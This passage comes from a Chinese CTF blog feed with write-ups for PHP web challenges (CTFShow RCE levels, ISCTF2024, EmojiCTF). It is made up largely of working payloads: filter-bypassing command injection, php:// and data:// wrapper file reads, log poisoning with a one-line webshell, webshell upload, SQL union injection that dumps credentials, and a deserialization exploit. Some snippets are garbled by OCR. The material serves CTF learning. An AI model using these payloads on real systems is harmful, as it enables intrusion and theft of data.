class="code"><pre><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_GET[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;       die(&quot;error v1&quot;);   &#125;   if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;       die(&quot;error v2&quot;);   &#125;   eval(&quot;echo new $v1($v2());&quot;); </span><br></pre></td></tr></table></figure>考点：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filesystemiterator 遍历文件类(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</span><br><span class="line"></span><br><span class="line">DirectoryIterator 遍历目录类</span><br><span class="line"></span><br><span class="line">getcwd()函数 获取当前工作目录 返回当前工作目录</span><br></pre></td></tr></table></figure>然后遍历目录就行，查看到f开头的文件，直接访问就行了### 111：### 112：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&quot;hacker!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>is_file函数是检查是不是存在这个文件，如果有echo hacker,否则就高亮显示；直接进行伪协议读取flag### 113:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function filter($file)&#123;   if(preg_match(&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;     die(&#x27;hacker!&#x27;);   &#125;else&#123;     return $file;   &#125; &#125; $file=$_GET[&#x27;file&#x27;]; if(! is_file($file))&#123;   highlight_file(filter($file)); &#125;else&#123;   echo &quot;hacker!&quot;; &#125;</span><br></pre></td></tr></table></figure>一看的话可能是伪协议；没有过滤封装协议；可以进行：?file=compress.zlib://flag.php### 114：`function filter($file){   if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){     die('hacker!');   }else{     return $file;   } } $file=$_GET['file']; echo "师傅们居然tql都是非预期 哼！"; if(! is_file($file)){   highlight_file(filter($file)); }else{   echo "hacker!"; } `师傅们居然tql都是非预期 哼！没有过滤filter;?file=php://filter/resource=flag.php;### 115:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function filter($num)&#123;   $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);   return $num; &#125; $num=$_GET[&#x27;num&#x27;]; if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;   if($num==&#x27;36&#x27;)&#123;     echo $flag;   &#125;else&#123;     echo &quot;hacker!!&quot;;   &#125; &#125;else&#123;   echo &quot;hacker!!!&quot;;</span><br></pre></td></tr></table></figure>1:进行替换 2：是不是整数 3：不=36 4：trim函数去除俩边空白符，但是没有过滤\f   5:filter(num)=36<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">for ($i = 0; $i &lt; 129; $i++) &#123;</span><br><span class="line">    $num = chr($i) . &#x27;36&#x27;;</span><br><span class="line">    if (trim($num) !== &#x27;36&#x27; &amp;&amp; is_numeric($num) &amp;&amp; $num !== &#x27;36&#x27;) &#123;</span><br><span class="line">        echo urlencode(chr($i)) . &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>进行测试；?num=%0c36]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>isctf2024web</title>
      <link href="/2025/03/16/isctf2024web/"/>
      <url>/2025/03/16/isctf2024web/</url>
      
        <content type="html"><![CDATA[<h2 id="ISCTF2024："><a href="#ISCTF2024：" class="headerlink" title="ISCTF2024："></a>ISCTF2024：</h2><h3 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php:"></a>1z_php:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;J&#x27;]))&#123;  $call=$_POST[&#x27;J&#x27;];  $dangerous_commands = [&#x27;cat&#x27;, &#x27;tac&#x27;, &#x27;head&#x27;, &#x27;nl&#x27;, &#x27;more&#x27;, &#x27;less&#x27;, &#x27;tail&#x27;, &#x27;vi&#x27;, &#x27;sed&#x27;, &#x27;od&#x27;];  foreach ($dangerous_commands as $command) &#123;    if (preg_match(&quot;/$command/i&quot;, $call)) &#123;      die(&quot;这些个危险函数可不兴使啊&quot;);    &#125;  &#125;  system($call);&#125;?&gt;</span><br></pre></td></tr></table></figure><p>J&#x3D;ls &#x2F;   J&#x3D;uniq &#x2F;f14g</p><h3 id="25时晓山瑞希生日会"><a href="#25时晓山瑞希生日会" class="headerlink" title="25时晓山瑞希生日会:"></a>25时晓山瑞希生日会:</h3><p>你不是烤p！要是Project Sekai的客户端请求才能加入生日会</p><p>在UA头上面改得到：你似乎没在正确的时间来…，额，时间:伪造data:Date: Thu, 27 Aug 2024 05:00:00 GMT</p><h3 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce:"></a>ezrce:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;cmd&#x27;])) &#123;   $cmd = $_GET[&#x27;cmd&#x27;];   if (preg_match(&quot;/flag|cat|ls|echo|php|bash|sh|more| |less|head|tail|[\|\&amp;\&gt;\&lt;]|eval|system|exec|popen|shell_exec/i&quot;, $cmd)) &#123;     die(&quot;Blocked by security filter!&quot;);   &#125; else &#123;     eval($cmd);   &#125; &#125; else &#123;   highlight_file(__FILE__); </span><br></pre></td></tr></table></figure><p>cmd&#x3D;var_dump(scandir(‘&#x2F;‘));进行读取根目录下面的文件发现flag，</p><h4 id="法1："><a href="#法1：" class="headerlink" title="法1："></a>法1：</h4><p>cmd&#x3D;include$_GET[1];&amp;1&#x3D;pHp:&#x2F;&#x2F;FilTer&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag 然后解码</p><h4 id="法2："><a href="#法2：" class="headerlink" title="法2："></a>法2：</h4><p>?cmd&#x3D;var_dump(file_get_contents($_GET[‘1’]));&amp;1&#x3D;&#x2F;flag</p><h4 id="法3"><a href="#法3" class="headerlink" title="法3:"></a>法3:</h4><p>取反绕过</p><h4 id="法4"><a href="#法4" class="headerlink" title="法4:"></a>法4:</h4><p>cmd&#x3D;passthru(‘cd%09..;cd%09..;uniq%09&#x2F;?l*’);</p><h3 id="ezserialize"><a href="#ezserialize" class="headerlink" title="ezserialize:"></a>ezserialize:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php error_reporting(0); class Flag &#123;   private $flag;   public function __construct() &#123;     $this-&gt;flag = file_get_contents(&#x27;/flag&#x27;);   &#125;   public function getFlag() &#123;     return $this-&gt;flag;   &#125;   public function __toString() &#123;     return &quot;You can&#x27;t directly access the flag!&quot;;   &#125; &#125; class User &#123;   public $username;   public $isAdmin = false;   public function __construct($username) &#123;     $this-&gt;username = $username;   &#125;   public function __wakeup() &#123;     if ($this-&gt;isAdmin) &#123;       echo &quot;Welcome, admin! Here&#x27;s your flag: &quot; . (new Flag())-&gt;getFlag();     &#125; else &#123;       echo &quot;Hello, &quot; . htmlspecialchars($this-&gt;username) . &quot;!&quot;;     &#125;   &#125; &#125; if (isset($_GET[&#x27;data&#x27;])) &#123;   $data = $_GET[&#x27;data&#x27;];   $object = unserialize($data);   if ($object instanceof User) &#123;     echo $object;   &#125; else &#123;     echo &quot;Invalid object!&quot;;   &#125; &#125; else &#123;   highlight_file(__FILE__); &#125; ?&gt; </span><br></pre></td></tr></table></figure><p>这个将false改为true然后随便传username就行了；</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag &#123;</span><br><span class="line">    private $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $isAdmin = true;</span><br><span class="line">&#125;</span><br><span class="line">$user = new User();</span><br><span class="line">$user-&gt;username =&quot;1&quot;;</span><br><span class="line">echo serialize($user);</span><br></pre></td></tr></table></figure><h3 id="小蓝鲨的临时存储室："><a href="#小蓝鲨的临时存储室：" class="headerlink" title="小蓝鲨的临时存储室："></a>小蓝鲨的临时存储室：</h3><p>这个直接传上去发现&#x2F;flag文件打不开权限不够</p><p>发现&#x2F;down_file.sh:find &#x2F;var&#x2F;www&#x2F;localhost&#x2F;htdocs&#x2F;uploads&#x2F; -type f -name “*.php” -exec rm -f {} ;</p><p>可以改为：&#x2F;flag &gt; &#x2F;tmp&#x2F;1.txt 然后等会就ok了</p><h3 id="小蓝鲨的冒险："><a href="#小蓝鲨的冒险：" class="headerlink" title="小蓝鲨的冒险："></a>小蓝鲨的冒险：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = &quot;isctf2024&quot;; $b = $_GET[&quot;b&quot;]; @parse_str($b); if ($a[0] != &#x27;QNKCDZO&#x27; &amp;&amp; md5($a[0]) == md5(&#x27;QNKCDZO&#x27;)) &#123;   $num = $_POST[&quot;num&quot;];   if($num == 2024)&#123;     die(&quot;QAQ&quot;);   &#125;   if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;     die(&quot;no no no!&quot;);   &#125;   if(intval($num,0) == 2024)&#123;     if (isset($_GET[&#x27;which&#x27;]))&#123;       $which = $_GET[&#x27;which&#x27;];       switch ($which)&#123;         case 0:           print(&#x27;QAQ&#x27;);         case 1:         case 2:           require_once $which.&#x27;.php&#x27;;           echo $flag;           break;         default:           echo GWF_HTML::error(&#x27;PHP-0817&#x27;, &#x27;Hacker NoNoNo!&#x27;, false);           break; </span><br></pre></td></tr></table></figure><p>首先是md5绕过：b&#x3D;a[0]&#x3D;240610708</p><p>然后:小数绕过：num&#x3D;2024.1或者8进制</p><p>然后：</p><p>if (isset($_GET[‘which’])){       $which &#x3D; $_GET[‘which’];       switch ($which){         case 0:           print(‘QAQ’);         case 1:         case 2:           require_once $which.’.php’;           echo $flag;           break;         default:           echo GWF_HTML::error(‘PHP-0817’, ‘Hacker NoNoNo!’, false);           break;</p><p>传which&#x3D;flag 正好匹配flag.php就出来了</p><h3 id="小蓝鲨的秘密："><a href="#小蓝鲨的秘密：" class="headerlink" title="小蓝鲨的秘密："></a>小蓝鲨的秘密：</h3><p>打开发现302跳转；直接抓包出来flag</p><h3 id="UP-UPloader"><a href="#UP-UPloader" class="headerlink" title="UP!UPloader:"></a>UP!UPloader:</h3><p>文件上传，传上去小马；然后发现include.php会出来文件源码，先读upload.php</p><p>文件上传到 .&#x2F;uploads&#x2F; 目录下，文件名被重命名成 [md5 加密](<a href="https://so.csdn.net/so/search?q=md5">https://so.csdn.net/so/search?q=md5</a> 加密&amp;spm&#x3D;1001.2101.3001.7020)+后缀，按照逻辑访问</p><p>然后蚁剑连接就行了</p><p>发现找不到这里可以在网站上面执行:</p><p>cmd&#x3D;system(‘env’);</p><p>cmd&#x3D;phpinfo();都可以找到</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>emojictfweb</title>
      <link href="/2025/03/16/emojictfweb/"/>
      <url>/2025/03/16/emojictfweb/</url>
      
        <content type="html"><![CDATA[<h2 id="emojictfweb"><a href="#emojictfweb" class="headerlink" title="emojictfweb"></a>emojictfweb</h2><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE:"></a>RCE:</h3><p>发现f12不能使用，没事，张师傅给我说ctrl+shift+i就可以了，ok.试了试发现没有有用的东西，dirsearch扫描一下发现robots.txt</p><p>然后发现 &#x2F;<a href="mailto:&#x66;&#108;&#x40;&#x67;&#x2e;&#112;&#x68;&#x70;">fl@g.php</a>,查看：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;emo&#x27;]))&#123;   $emo = $_GET[&#x27;emo&#x27;];  if(!preg_match(&quot;/\;|\&quot;|\*| |[b-h]|[m-r]|\\$|\&#123;|\&#125;|\^|\&gt;/i&quot;,$emo))&#123;    system($emo);  &#125;  else&#123;    echo &quot;Again&quot;;    &#125;&#125;else&#123;  echo &quot;Try&quot;;&#125;</span><br></pre></td></tr></table></figure><p>先进行ls查看，发现flag.txt，然后emo&#x3D;tail%09??a?.txt进行查看</p><h3 id="http"><a href="#http" class="headerlink" title="http:"></a>http:</h3><p>你的User-Agent必须被服务器识别为EMOJI_CTF_User_Agent_v1.0  只有使用正确的HTTP方法才能获取flag，不同的方法会得到不同的提示。 需要提供正确的自定义头部EMOJI-CTF-Auth且其值为’Passw0rd!’。 全部完成你就能获得flag!!!</p><p>在bp上面改然后在http方法上面进行爆破测试是什么方法，发现是PUT方法，然后访问fl1l1l1l1ag.php</p><h3 id="e4-sql"><a href="#e4-sql" class="headerlink" title="e4_sql:"></a>e4_sql:</h3><p>进行访问发现1”时候报错说明是字符形注入</p><p>1” order by 2#的时候和 3和4的时候不一样说明有俩列</p><p>-1” union select 1,2#发现2是回显位置</p><p>然后他没有过滤，直接注就行了</p><p>-1” union select 1,database()#<br>-1” union select 1,(select group_concat(username,password) from information)#</p><h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web:"></a>easy_web:</h3><p>欢迎打开这个题目!</p><p>但是你的访问被拒绝了，因为我们采用了和知乎一样的反爬虫策略，而你的访问被认为是违规的爬虫了。</p><p>根据提示： User-Agent:Baiduspider</p><p>然后：欢迎来自垃圾百度的臭虫子！但是你爬不到什么了，因为本网站现在仅允许来自CloudFlare CDN的流量</p><p>那么CloudFlareCDN是什么，要特地提出来呢，不知道就去搜，Cloudflare HTTP 标头(<a href="https://developers.cloudflare.com/fundamentals/reference/http-headers/">Cloudflare HTTP 标头 ·Cloudflare 基础知识文档</a>)</p><p>然后就随便尝试了一下</p><p>CF-Connecting-IP:1<br>CF-IPCountry:1</p><p>发现好吧，你来自cloudflare CDN了，但是为了安全，后面的机密内容只能通过洋葱访问（我是怎么知道你是否来自洋葱的呢？这也是CF悄悄告诉我的呀）!</p><p>然后去查了查:</p><p>CF-Connecting-IP:1<br>CF-IPCountry:T1</p><p>OK完事了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHOWRCE</title>
      <link href="/2025/03/05/SHOWRCE/"/>
      <url>/2025/03/05/SHOWRCE/</url>
      
        <content type="html"><![CDATA[<h2 id="接下来开始我们的RCE刷题SHOW"><a href="#接下来开始我们的RCE刷题SHOW" class="headerlink" title="接下来开始我们的RCE刷题SHOW"></a>接下来开始我们的RCE刷题SHOW</h2><h3 id="29："><a href="#29：" class="headerlink" title="29："></a>29：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset(</span><br><span class="line">$_GET[&#x27;c’]));if(!preg_match(&quot;/flag/i&quot;,$c))&#123;eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">highlight file( FILE );</span><br></pre></td></tr></table></figure><p>先看代码分析出来这个是命令执行，让我们get传参c,然后过滤了flag和他的大小写</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">那么payload就出来了：c=system(&#x27;tac fl*.php&#x27;);(也可以使用其他的查看符)</span><br><span class="line"></span><br><span class="line">其他：c=system(&#x27;tac fl&quot;&quot;ag.php&#x27;);c=system(&#x27;tac fl``ag.php&#x27;);c=system(&#x27;ta\c fl\ag.php&#x27;);等等</span><br></pre></td></tr></table></figure><h3 id="30："><a href="#30：" class="headerlink" title="30："></a>30：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c’]))&#123;8c = S GETL&#x27;c’]:if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;eval($c):</span><br><span class="line">&#125;else&#123;</span><br><span class="line">highlight_file( FILE);</span><br></pre></td></tr></table></figure><p>和上面的差不多，就是过滤的多了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line"></span><br><span class="line">?c=passthru(&quot;tac fla*&quot;);</span><br><span class="line"></span><br><span class="line">?c=echo`tac fla*`;</span><br><span class="line"></span><br><span class="line">?c=$a=sys;$b=tem;$c=$a.$b;$c(&quot;tac fla*&quot;);</span><br><span class="line"></span><br><span class="line">?c=echo shell_exec(&quot;tac fla*&quot;);</span><br><span class="line"></span><br><span class="line">?c=eval($_GET[1]);&amp;1=system(&quot;tac flag.php&quot;);</span><br><span class="line"></span><br><span class="line">echo `nl fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;(show答案)</span><br></pre></td></tr></table></figure><h3 id="31："><a href="#31：" class="headerlink" title="31："></a>31：</h3><p>多过滤了cat sort 这个怎么越来越多了，可以进行传参：c&#x3D;eval($_GET[a]);&amp;a&#x3D;system(‘cat flag.php’);也可以使用passthru(要注意过滤了空格)</p><h3 id="32："><a href="#32：" class="headerlink" title="32："></a>32：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;</span><br></pre></td></tr></table></figure><p>这个不知道为什么不可以用passthru做，不过没关系，可以使用伪协议做，但是首先要先传参：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">palyoad:</span><br><span class="line"></span><br><span class="line">?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;)?&gt;</span><br><span class="line"></span><br><span class="line">上面的可以使用到36，不过要注意一些过滤，比如空格什么的</span><br></pre></td></tr></table></figure><h3 id="37："><a href="#37：" class="headerlink" title="37："></a>37：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;   $c = $_GET[&#x27;c&#x27;];   if(!preg_match(&quot;/flag/i&quot;, $c))&#123;     include($c);     echo $flag;     &#125; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用选择使用data:[?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</span><br><span class="line"></span><br><span class="line">或者传小🐎：</span><br><span class="line"></span><br><span class="line">?c=include$_GET[a]?%3E&amp;a=../../../../var/log/nginx/access.log</span><br><span class="line"> /var/log/nginx/access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可</span><br></pre></td></tr></table></figure><p>然后一直到39关了上面的都大差不差</p><h3 id="40："><a href="#40：" class="headerlink" title="40："></a>40：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c)</span><br></pre></td></tr></table></figure><p>这个一下子给我弄不会了，</p><p>只能看wp做了：</p><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=eval(array_pop(next(get_defined_vars())));//需要POST传入参数为1=system(&#x27;tac fl*&#x27;);</span><br><span class="line"></span><br><span class="line">get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。</span><br><span class="line"></span><br><span class="line">next()将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"></span><br><span class="line">array_pop() 函数删除数组中的最后一个元素并返回其值。</span><br></pre></td></tr></table></figure><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c=show_source(next(array_reverse(scandir(getcwd()))));</span><br><span class="line"></span><br><span class="line">getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())</span><br><span class="line"></span><br><span class="line">localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为&quot;.&quot;</span><br><span class="line"></span><br><span class="line">pos():输出数组第一个元素，不改变指针；</span><br><span class="line"></span><br><span class="line">current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样</span><br><span class="line"></span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为&quot;.&quot;所以遍历当前目录</span><br><span class="line"></span><br><span class="line">array_reverse():数组逆置</span><br><span class="line"></span><br><span class="line">next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以</span><br><span class="line"></span><br><span class="line">show_source():查看源码</span><br><span class="line"></span><br><span class="line">pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。</span><br><span class="line"></span><br><span class="line">每个数组中都有一个内部的指针指向它的&quot;当前&quot;元素，初始指向插入到数组中的第一个元素。</span><br><span class="line"></span><br><span class="line">提示：该函数不会移动数组内部指针。</span><br><span class="line"></span><br><span class="line">相关的方法：</span><br><span class="line"></span><br><span class="line">current()返回数组中的当前元素的值。</span><br><span class="line"></span><br><span class="line">end()将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line"></span><br><span class="line">next()将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"></span><br><span class="line">prev()将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line"></span><br><span class="line">reset()将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line"></span><br><span class="line">each()返回当前元素的键名和键值，并将内部指针向前移动。</span><br></pre></td></tr></table></figure><h3 id="41："><a href="#41：" class="headerlink" title="41："></a>41：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">然后41跑yu师傅脚本就ok了</span><br></pre></td></tr></table></figure><h3 id="42："><a href="#42：" class="headerlink" title="42："></a>42：</h3><p>终于简单了；</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;   $c=$_GET[&#x27;c&#x27;];   system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;else&#123;   highlight_file(__FILE__); &#125;</span><br></pre></td></tr></table></figure><p>这行代码执行一个系统命令，该命令由变量 $c 的值指定。&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 是一个 shell  重定向操作，意味着命令的标准输出（stdout）和标准错误（stderr）都被重定向到  &#x2F;dev&#x2F;null，即被丢弃，（个人理解是内容注释注释）用户不会看到任何输出结果 所以直接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=cat flag.php||%0a</span><br></pre></td></tr></table></figure><p>使用管道符进行绕过让他执行前面的</p><h3 id="43："><a href="#43：" class="headerlink" title="43："></a>43：</h3><p>比前面多过滤了cat、；，那就利用tac，uniq,less,more,strings,nl命令来打印，“||”分割</p><p>或者使用重定向：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nl%20flag.php| tee 1.txt</span><br></pre></td></tr></table></figure><p>然后访问1.txt</p><h3 id="44"><a href="#44" class="headerlink" title="44:"></a>44:</h3><p>44呢和43差不多,就多了一个flag,可以?l*.php</p><h3 id="45："><a href="#45：" class="headerlink" title="45："></a>45：</h3><p>(多了cat):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;     system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">palyad:c=uniq$&#123;IFS&#125;?l*.php||</span><br></pre></td></tr></table></figure><h3 id="46-53"><a href="#46-53" class="headerlink" title="46-53:"></a>46-53:</h3><p>都差不多，可以多记点替代cat的和system以及空格的</p><h3 id="54："><a href="#54：" class="headerlink" title="54："></a>54：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))</span><br></pre></td></tr></table></figure><p>过滤 了很多命令。 中间这些个很多的星号的内容，其实 是说，含有 cat,more这样的会被匹配，如cat 那么ca323390ft或c232fa3kdfst, 凡是按序出现了cat 都被匹配。 这时，我们不能直接写ca?因为这样是匹配不到命令的。 只能把全路径写出来，如&#x2F;bin&#x2F;ca?,与&#x2F;bin&#x2F;ca?匹配的，只有&#x2F;bin&#x2F;cat命令，这样就用到了cat 命令了。</p><p>于是，有了payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/bin/ca?$&#123;IFS&#125;????.???</span><br></pre></td></tr></table></figure><p>   然后   查看源码</p><h3 id="55"><a href="#55" class="headerlink" title="55:"></a>55:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由于过滤了字母，但没有过滤数字可以考虑数字编码：</span><br><span class="line"></span><br><span class="line">$&#x27;\164\141\143&#x27; $&#x27;\146\154\141\147\56\160\150\160&#x27;</span><br><span class="line"></span><br><span class="line">也可以使用通配符?来进行代替</span><br><span class="line"></span><br><span class="line">?c=/bin/base64 flag.php</span><br><span class="line"></span><br><span class="line">替换后变成</span><br><span class="line"></span><br><span class="line">?c=/???/????64 ????.???</span><br></pre></td></tr></table></figure><h3 id="56-57："><a href="#56-57：" class="headerlink" title="56+57："></a>56+57：</h3><p>这个的话没看明白</p><h3 id="58-65："><a href="#58-65：" class="headerlink" title="58-65："></a>58-65：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进行post传c,并且eval($c)</span><br><span class="line"></span><br><span class="line">这里嘛，要引入新的函数：show_source,highlight_file;这两个都是对文件进行语法高亮显示</span><br><span class="line"></span><br><span class="line">那么palyad就出来了：c=show_source(‘flag.php’);/highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">或者可以利用文件包含写：c=include($_POST[&#x27;w&#x27;]);&amp;w=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="66-67"><a href="#66-67" class="headerlink" title="66-67:"></a>66-67:</h3><p>这个呢引入一个新的东西：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print_r(scandir(&quot;/&quot;));(print_r或者也可以换成var_dump/var_export)和前面的一样不过在本目录下面没有flag.php/txt,那个新的东西是查看指定的目录，先返回根目录，然后就发现根目录下面存在着flag.txt，那个就可以show_source(&quot;/flag.txt&quot;);或者另一个；</span><br></pre></td></tr></table></figure><h3 id="68-70"><a href="#68-70" class="headerlink" title="68-70:"></a>68-70:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这一关禁用了highlight_file。依然可以使用上一关的var_dump结合scandir来显示根目录的文件列表。</span><br><span class="line"> c=var_dump(scandir(&#x27;/&#x27;));之后show_source和highlight_file都用不了,试试include和require即可。</span><br></pre></td></tr></table></figure><h3 id="71："><a href="#71：" class="headerlink" title="71："></a>71：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span 